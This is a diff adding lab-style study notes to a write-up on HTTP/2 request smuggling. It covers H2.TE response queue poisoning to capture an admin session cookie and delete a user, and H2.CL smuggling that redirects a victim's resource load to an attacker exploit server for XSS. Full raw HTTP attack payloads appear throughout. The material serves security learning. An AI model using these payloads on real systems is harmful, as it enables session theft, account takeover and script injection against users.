@@ -74,3 +74,72 @@ The primary distinction is the **protocol boundary** being exploited.
 
 Therefore, HTTP/2 Request Smuggling should be considered a **protocol translation and request parsing problem**, rather than simply another form of CL.TE or TE.CL.
 
+### a. Response Queue Poisoning via H2.TE Request Smuggling
+
+* **The Objective:** Exploit an **H2.TE request smuggling** vulnerability to poison the backend response queue, capture an administrator's authenticated response, obtain their session cookie, access `/admin`, and delete the user **carlos**.
+
+* **The Mechanism:** The frontend accepts an HTTP/2 request containing `Transfer-Encoding: chunked` and downgrades it to HTTP/1.1. The `0` chunk terminates the frontend's interpretation of the request, while the remaining bytes are treated by the backend as a smuggled HTTP/1.1 request. This desynchronizes the backend request/response sequence and allows the attacker to receive responses belonging to other users.
+
+* **Core Layout Structure (Desynchronization Test):**
+
+```http
+POST / HTTP/2
+Host: target.com
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+
+* **The Response Queue Poisoning:** After confirming the desynchronization, the attacker smuggles a complete HTTP/1.1 request to a nonexistent endpoint so that the expected response is consistently `404`. This makes responses belonging to other users easier to identify.
+
+```http
+POST /x HTTP/2
+Host: target.com
+Transfer-Encoding: chunked
+
+0
+
+GET /x HTTP/1.1
+Host: target.com
+
+```
+
+The smuggled request must be terminated with `\r\n\r\n` after the `Host` header.
+
+* **The Session Capture:** The poisoned response queue is repeatedly queried until a response intended for the administrator is captured. The administrator periodically logs in, generating a `302` response containing their new authenticated session cookie. The attacker extracts this cookie and uses it to impersonate the administrator.
+
+```http
+GET /admin HTTP/2
+Host: target.com
+Cookie: session=STOLEN-SESSION-COOKIE
+```
+
+* **The Administrative Action:** Once the administrator's session is obtained, the attacker accesses `/admin` and identifies the delete endpoint `/admin/delete?username=carlos`. Replacing the request path with this endpoint while retaining the stolen session cookie allows the attacker to delete **carlos**.
+
+* **The Security Impact:** H2.TE response queue poisoning can cause cross-user response capture and session theft. A successful attack can lead to authentication bypass, account takeover, and unauthorized administrative actions.
+
+### b. H2.CL Request Smuggling
+
+* **The Objective:** Exploit an **H2.CL request smuggling** vulnerability to poison the backend connection and cause the victim's browser to load and execute an attacker-controlled JavaScript file containing `alert(document.cookie)`.
+
+* **The Mechanism:** The frontend accepts an HTTP/2 request with `Content-Length: 0` and downgrades it to HTTP/1.1. The frontend considers the request body empty, while the backend continues processing the remaining bytes as a smuggled HTTP/1.1 request. By smuggling a `/resources` request with an attacker-controlled `Host` header, the attacker redirects the victim's resource request to the exploit server.
+
+* **Core Layout Structure:**
+
+```http id="j7xq2m"
+POST / HTTP/2
+Host: target.com
+Content-Length: 0
+
+GET /resources HTTP/1.1
+Host: YOUR-EXPLOIT-SERVER
+Content-Length: 5
+
+x=1
+```
+
+* **The XSS Delivery:** The attacker hosts a malicious JavaScript payload at `/resources` on the exploit server. By repeatedly poisoning the connection and timing the attack with the victim's request, the victim is redirected to the malicious resource, causing `alert(document.cookie)` to execute.
+
+* **The Security Impact:** H2.CL request smuggling can be combined with open-redirect behavior to deliver attacker-controlled JavaScript to other users, potentially resulting in cookie theft, session compromise, and account takeover.
